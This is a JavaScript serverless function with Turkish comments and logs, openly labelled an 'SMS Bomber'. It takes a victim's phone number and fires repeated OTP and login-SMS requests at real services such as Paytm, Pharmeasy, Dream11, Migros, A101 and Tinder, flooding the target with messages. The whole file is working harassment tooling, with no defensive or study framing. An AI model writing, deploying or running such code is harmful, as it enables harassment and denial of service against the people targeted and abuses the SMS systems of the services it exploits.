// api/smsboom.js - Vercel Serverless Function
import fetch from 'node-fetch';

export default async function handler(req, res) {
  // CORS headers
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

  // Handle OPTIONS request for CORS
  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  try {
    let phone, amount, country = '91';

    if (req.method === 'GET') {
      phone = req.query.phone;
      amount = req.query.amount || 5;
      country = req.query.country || '91';
    } else if (req.method === 'POST') {
      phone = req.body.phone;
      amount = req.body.amount || 5;
      country = req.body.country || '91';
    } else {
      return res.status(405).json({
        status: 'error',
        message: 'Sadece GET ve POST methodu destekleniyor'
      });
    }

    if (!phone) {
      return res.status(400).json({
        status: 'error',
        message: 'phone parametresi gereklidir'
      });
    }

    // Telefon numarasını temizle
    phone = phone.replace(/\s/g, '');
    
    // Telefon validasyonu
    if (!isValidPhone(phone, country)) {
      return res.status(400).json({
        status: 'error',
        message: `Geçersiz telefon formatı. Ülke: +${country}, Numara: ${phone}`
      });
    }

    // Miktar sınırı
    amount = Math.min(Math.max(parseInt(amount), 1), 5); // Vercel timeout için max 5

    console.log(`🚀 SMS Bomber Başlatılıyor: +${country}${phone} - Miktar: ${amount}`);

    // SMS Bomber'ı başlat (async - Vercel timeout'u önlemek için)
    const result = await startSMSBombing(phone, amount, country);
    
    res.status(200).json({
      status: 'success',
      endpoint: '/api/smsboom',
      method: req.method,
      phone: phone,
      country: country,
      amount: amount,
      total_attempts: result.total,
      successful: result.successful,
      failed: result.failed,
      services_used: result.services.map(s => s.name),
      results: result.details,
      timestamp: new Date().toISOString()
    });

  } catch (error) {
    console.error('SMS Bomber Hatası:', error);
    res.status(500).json({
      status: 'error',
      message: 'SMS gönderilirken hata oluştu: ' + error.message
    });
  }
}

// Telefon validasyonu
function isValidPhone(phone, country) {
  const patterns = {
    '91': /^[6-9][0-9]{9}$/, // Hindistan
    '977': /^[9][0-9]{9}$/, // Nepal
    '218': /^[9][0-9]{8}$/, // Libya
    '90': /^5[0-9]{9}$/, // Türkiye
    '1': /^[2-9][0-9]{9}$/, // ABD/Kanada
    '44': /^7[0-9]{9}$/ // UK
  };
  
  return patterns[country] ? patterns[country].test(phone) : /^[0-9]{10,15}$/.test(phone);
}

// SMS Bomber fonksiyonu
async function startSMSBombing(phone, amount, country) {
  const results = {
    total: 0,
    successful: 0,
    failed: 0,
    services: getServicesByCountry(country),
    details: []
  };

  // Hızlı mod - Vercel timeout'u önlemek için
  const fastMode = amount > 3;
  
  // Her tur için
  for (let round = 0; round < amount; round++) {
    console.log(`📦 Tur ${round + 1}/${amount} başlatılıyor...`);
    
    // Her servis için
    for (const service of results.services) {
      if (results.total >= 15) break; // Vercel timeout önleme
      
      results.total++;
      
      try {
        // URL ve data'yı formatla
        const formattedUrl = formatTemplate(service.url, phone, country);
        const formattedData = formatData(service.data, phone, country);
        
        const requestOptions = {
          method: service.method,
          headers: {
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            ...service.headers
          },
          timeout: 10000 // 10 saniye timeout
        };

        // GET veya POST için body ayarla
        if (service.method === 'POST') {
          requestOptions.body = JSON.stringify(formattedData);
        }

        const response = await fetch(formattedUrl, requestOptions);
        const responseText = await response.text();
        
        let isSuccess = false;
        
        // Başarı kontrolü
        if (service.identifier) {
          isSuccess = responseText.includes(service.identifier) || 
                     response.status === 200 || 
                     response.status === 202;
        } else {
          isSuccess = response.status === 200 || response.status === 202;
        }

        if (isSuccess) {
          results.successful++;
          console.log(`✅ ${service.name} - Başarılı`);
        } else {
          results.failed++;
          console.log(`❌ ${service.name} - Başarısız (${response.status})`);
        }

        results.details.push({
          round: round + 1,
          service: service.name,
          status: isSuccess ? 'success' : 'failed',
          status_code: response.status,
          timestamp: new Date().toISOString()
        });

        // Hızlı modda daha az bekle
        if (!fastMode) {
          await new Promise(resolve => setTimeout(resolve, 1500));
        }
        
      } catch (error) {
        results.failed++;
        results.details.push({
          round: round + 1,
          service: service.name,
          status: 'error',
          error: error.message,
          timestamp: new Date().toISOString()
        });
        console.log(`⚠️ ${service.name} - Hata: ${error.message}`);
        
        if (!fastMode) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }
    }
    
    // Tur arası bekleme
    if (round < amount - 1 && !fastMode) {
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
  }

  console.log(`🎉 SMS Bomber tamamlandı! Başarılı: ${results.successful}, Başarısız: ${results.failed}`);
  return results;
}

// Template formatlama
function formatTemplate(template, phone, country) {
  return template
    .replace(/{target}/g, phone)
    .replace(/{cc}/g, country);
}

// Data formatlama
function formatData(data, phone, country) {
  if (typeof data === 'string') {
    return formatTemplate(data, phone, country);
  }
  
  if (!data) return {};
  
  const formatted = {};
  for (const [key, value] of Object.entries(data)) {
    if (typeof value === 'string') {
      formatted[key] = formatTemplate(value, phone, country);
    } else {
      formatted[key] = value;
    }
  }
  return formatted;
}

// Ülkeye göre servisleri getir
function getServicesByCountry(country) {
  const services = {
    '91': [ // Hindistan
      {
        name: "Paytm",
        method: "POST",
        url: "https://commonfront.paytm.com/v4/api/sendsms",
        data: {
          phone: "{target}",
          guid: "2952fa812660c58dc160ca6c9894221d"
        },
        identifier: "202"
      },
      {
        name: "Pharmeasy",
        method: "POST",
        url: "https://pharmeasy.in/api/auth/requestOTP",
        data: {
          contactNumber: "{target}"
        },
        identifier: "resendSmsCounter"
      },
      {
        name: "Dream11",
        method: "POST",
        url: "https://api.dream11.com/sendsmslink",
        data: {
          siteId: "1",
          mobileNum: "{target}",
          appType: "androidfull"
        },
        identifier: "true"
      }
    ],
    '90': [ // Türkiye
      {
        name: "Bim",
        method: "POST",
        url: "https://bim.veesk.net/service/v1.0/account/login",
        data: { phone: "{target}" }
      },
      {
        name: "Migros",
        method: "POST",
        url: "https://rest.migros.com.tr/sanalmarket/users/login/otp", 
        data: { phoneNumber: "{target}" }
      },
      {
        name: "A101",
        method: "POST",
        url: "https://www.a101.com.tr/users/otp-login/",
        data: { phone: "{target}", next: "/a101-kapida" }
      }
    ],
    '1': [ // ABD/Kanada
      {
        name: "Tinder US",
        method: "POST",
        url: "https://api.gotinder.com/v2/auth/sms/send",
        data: {
          phone_number: "{cc}{target}"
        },
        identifier: "200"
      }
    ],
    'multi': [ // Çoklu ülke
      {
        name: "Global Service 1",
        method: "POST",
        url: "https://api.gotinder.com/v2/auth/sms/send",
        data: {
          phone_number: "{cc}{target}"
        },
        identifier: "200"
      }
    ]
  };

  // Seçilen ülke + multi servisleri (max 4 servis - Vercel optimizasyonu)
  const selectedServices = [
    ...(services[country] || services['91']), // Fallback Hindistan
    ...services.multi
  ];
  
  return selectedServices.slice(0, 4);
}